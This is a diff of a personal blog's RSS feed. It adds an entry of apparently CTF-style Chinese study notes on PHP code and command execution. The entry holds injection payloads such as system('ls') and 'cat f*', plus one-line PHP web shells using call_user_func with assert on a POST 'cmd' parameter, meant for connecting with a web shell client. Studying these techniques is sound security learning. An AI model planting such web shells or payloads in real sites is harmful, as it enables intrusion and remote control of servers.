@@ -6,7 +6,16 @@
     <description>Recent content in 📕 web on DiFly&#39;s Blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Tue, 12 Sep 2023 23:27:43 +0800</lastBuildDate><atom:link href="https://DiFly0828.github.io/en/posts/web/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Thu, 14 Sep 2023 17:35:48 +0800</lastBuildDate><atom:link href="https://DiFly0828.github.io/en/posts/web/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>命令执行</title>
+      <link>https://DiFly0828.github.io/en/posts/web/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</link>
+      <pubDate>Thu, 14 Sep 2023 17:35:48 +0800</pubDate>
+      
+      <guid>https://DiFly0828.github.io/en/posts/web/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</guid>
+      <description>命令执行 eval内执行的是php代码 所以必须要以分号结尾 eval是代码执行函数 system是命令执行函数 cat是具体的函数 phpinfo(); system(&amp;rsquo;ls&amp;rsquo;) ; 当前目录 system(&amp;rsquo;ls%20/&amp;rsquo;) ;根目录 system(&amp;lsquo;cat%20f*&amp;rsquo;); 代码执行函数 eval() ：结尾加分号 assert() ：结尾不加分号 call_user_func() : 1. &amp;lt;?php call_user_func(&amp;#34;assert&amp;#34;,$_POST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; //post:cmd=system(whoami) 蚁剑连接 cmd 2. &amp;lt;?php call_user_func($_POST[&amp;#34;fun&amp;#34;],$_POST[&amp;#34;para&amp;#34;])?&amp;gt; //post:fun=assert&amp;amp;para=phpinfo(); create_function(): array_map(): call_user_func_array(): array_filter(): uasort(): preg_replace(): PHP中常见的命令执行函数与代码执行函数_红烧</description>
+    </item>
+    
     <item>
       <title>Helloworld</title>
       <link>https://DiFly0828.github.io/en/posts/web/helloworld/</link>
